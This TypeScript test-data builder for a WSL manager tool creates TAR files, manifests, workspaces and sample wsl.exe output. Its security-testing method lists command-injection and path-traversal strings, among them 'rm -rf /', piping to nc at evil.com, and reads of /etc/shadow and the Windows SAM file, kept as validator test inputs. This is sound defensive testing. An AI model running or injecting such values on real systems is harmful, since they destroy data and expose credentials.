/**
 * Test Data Builder
 * Creates real test data for testing without mocks
 *
 * @author Marcus Johnson, QA Manager
 */

import * as fs from 'fs';
import * as path from 'path';
import * as crypto from 'crypto';
import { WSLDistribution } from '../../src/wslManager';

/**
 * Builds real test data for WSL Manager testing
 * No mocks - all data represents real scenarios
 */
export class TestDataBuilder {
    private readonly fixturesPath = path.join(__dirname, '../fixtures');
    private readonly tempPath = path.join(process.env.TEMP || '/tmp', 'wsl-test-data');

    constructor() {
        // Ensure directories exist
        this.ensureDirectories();
    }

    /**
     * Creates a real TAR file for testing import operations
     * @param name Name for the TAR file
     * @param sizeKb Approximate size in KB
     * @returns Path to the created TAR file
     */
    createRealTarFile(name: string, sizeKb: number = 100): string {
        const tarPath = path.join(this.tempPath, `${name}.tar`);

        // Create a simple TAR structure (minimal valid TAR)
        // TAR format: 512-byte blocks
        const blocks = Math.ceil(sizeKb * 1024 / 512);
        const buffer = Buffer.alloc(blocks * 512);

        // TAR header structure (simplified)
        const header = Buffer.alloc(512);
        const fileName = 'rootfs/';

        // Write file name
        header.write(fileName, 0, 100, 'utf8');

        // Write file mode (755 for directory)
        header.write('0000755', 100, 8, 'utf8');

        // Write uid/gid (root)
        header.write('0000000', 108, 8, 'utf8'); // uid
        header.write('0000000', 116, 8, 'utf8'); // gid

        // Write size (0 for directory)
        header.write('00000000000', 124, 12, 'utf8');

        // Write mtime (current time)
        const mtime = Math.floor(Date.now() / 1000).toString(8);
        header.write(mtime.padStart(11, '0'), 136, 12, 'utf8');

        // Write type flag (5 = directory)
        header.write('5', 156, 1, 'utf8');

        // Write magic
        header.write('ustar', 257, 6, 'utf8');

        // Calculate and write checksum
        let checksum = 0;
        for (let i = 0; i < 512; i++) {
            checksum += header[i];
        }
        header.write(checksum.toString(8).padStart(6, '0'), 148, 8, 'utf8');

        // Copy header to buffer
        header.copy(buffer, 0);

        // Add some random data to reach target size
        const randomData = crypto.randomBytes(Math.min(sizeKb * 1024 - 512, buffer.length - 512));
        randomData.copy(buffer, 512);

        // Write to file
        fs.writeFileSync(tarPath, buffer);

        return tarPath;
    }

    /**
     * Generates a valid distribution manifest
     * @param name Distribution name
     * @param version Distribution version
     * @returns Manifest object
     */
    generateValidManifest(name: string = 'TestDistro', version: string = '1.0.0'): any {
        return {
            name,
            version,
            description: `Test distribution ${name}`,
            baseImage: 'alpine:latest',
            downloadUrl: `https://example.com/${name.toLowerCase()}.tar`,
            size: 50 * 1024 * 1024, // 50MB
            checksum: crypto.randomBytes(32).toString('hex'),
            requirements: {
                wslVersion: 2,
                minimumWindowsBuild: 19041
            },
            features: ['systemd', 'docker'],
            created: new Date().toISOString(),
            lastUpdated: new Date().toISOString()
        };
    }

    /**
     * Creates a test workspace directory structure
     * @param name Workspace name
     * @returns Path to created workspace
     */
    createTestWorkspace(name: string): string {
        const workspacePath = path.join(this.tempPath, `workspace-${name}`);

        // Create directory structure
        const dirs = [
            workspacePath,
            path.join(workspacePath, '.vscode'),
            path.join(workspacePath, 'src'),
            path.join(workspacePath, 'test')
        ];

        for (const dir of dirs) {
            if (!fs.existsSync(dir)) {
                fs.mkdirSync(dir, { recursive: true });
            }
        }

        // Create basic files
        fs.writeFileSync(
            path.join(workspacePath, '.vscode', 'settings.json'),
            JSON.stringify({
                'wsl-manager.defaultDistributionPath': workspacePath,
                'wsl-manager.autoRegisterProfiles': true
            }, null, 2)
        );

        fs.writeFileSync(
            path.join(workspacePath, 'README.md'),
            `# Test Workspace ${name}\nCreated for WSL Manager testing`
        );

        return workspacePath;
    }

    /**
     * Builds a WSL distribution object with real-looking data
     * @param overrides Optional property overrides
     * @returns WSLDistribution object
     */
    buildDistribution(overrides?: Partial<WSLDistribution>): WSLDistribution {
        const names = ['Ubuntu', 'Debian', 'Alpine', 'Fedora', 'openSUSE'];
        const randomName = names[Math.floor(Math.random() * names.length)];

        return {
            name: randomName + '-' + crypto.randomBytes(2).toString('hex'),
            state: Math.random() > 0.5 ? 'Running' : 'Stopped',
            version: Math.random() > 0.3 ? '2' : '1',
            default: false,
            ...overrides
        };
    }

    /**
     * Creates sample WSL command output for testing parsers
     * @param type Type of output to generate
     * @returns Sample output string
     */
    generateWSLOutput(type: 'list' | 'version' | 'help'): string {
        switch (type) {
            case 'list':
                return `  NAME                   STATE           VERSION
* Ubuntu                 Running         2
  Debian                 Stopped         2
  Alpine                 Stopped         1`;

            case 'version':
                return `WSL version: 2.0.0.0
Kernel version: 5.15.90.1
WSLg version: 1.0.51
Windows version: 10.0.22621.2428`;

            case 'help':
                return `Usage: wsl.exe [options] [command]
Options:
  --list, -l         List distributions
  --set-default, -s  Set default distribution
  --import           Import a distribution
  --export           Export a distribution`;

            default:
                return '';
        }
    }

    /**
     * Creates a real file with specific content
     * @param filePath Path to create file
     * @param content File content
     * @returns Created file path
     */
    createFile(filePath: string, content: string): string {
        const dir = path.dirname(filePath);
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }
        fs.writeFileSync(filePath, content);
        return filePath;
    }

    /**
     * Generates invalid input for security testing
     * @param type Type of invalid input
     * @returns Array of test inputs
     */
    generateInvalidInputs(type: 'command' | 'path' | 'name'): string[] {
        switch (type) {
            case 'command':
                return [
                    '; rm -rf /',
                    '&& malicious-command',
                    '| nc evil.com 1234',
                    '`cat /etc/passwd`',
                    '$(whoami)',
                    '../../../etc/passwd',
                    'test; echo hacked'
                ];

            case 'path':
                return [
                    '../../../etc/passwd',
                    '..\\..\\..\\Windows\\System32',
                    '/etc/shadow',
                    'C:\\Windows\\System32\\config\\sam',
                    '\\\\server\\share\\sensitive',
                    'file://etc/passwd',
                    '\0/etc/passwd'
                ];

            case 'name':
                return [
                    'test; rm -rf /',
                    'test && echo hacked',
                    'test`whoami`',
                    'test$(id)',
                    '../test',
                    '..\\test',
                    'test\0null',
                    'test\nnewline',
                    'test\r\ncarriage'
                ];

            default:
                return [];
        }
    }

    /**
     * Cleanup temporary test data
     */
    cleanup(): void {
        if (fs.existsSync(this.tempPath)) {
            fs.rmSync(this.tempPath, { recursive: true, force: true });
        }
    }

    /**
     * Ensure required directories exist
     */
    private ensureDirectories(): void {
        const dirs = [
            this.fixturesPath,
            this.tempPath,
            path.join(this.fixturesPath, 'distributions'),
            path.join(this.fixturesPath, 'manifests')
        ];

        for (const dir of dirs) {
            if (!fs.existsSync(dir)) {
                fs.mkdirSync(dir, { recursive: true });
            }
        }
    }
}

/**
 * Global test data builder instance
 */
export const testDataBuilder = new TestDataBuilder();

/**
 * Cleanup helper for afterEach hooks
 */
export function cleanupTestData(): void {
    testDataBuilder.cleanup();
}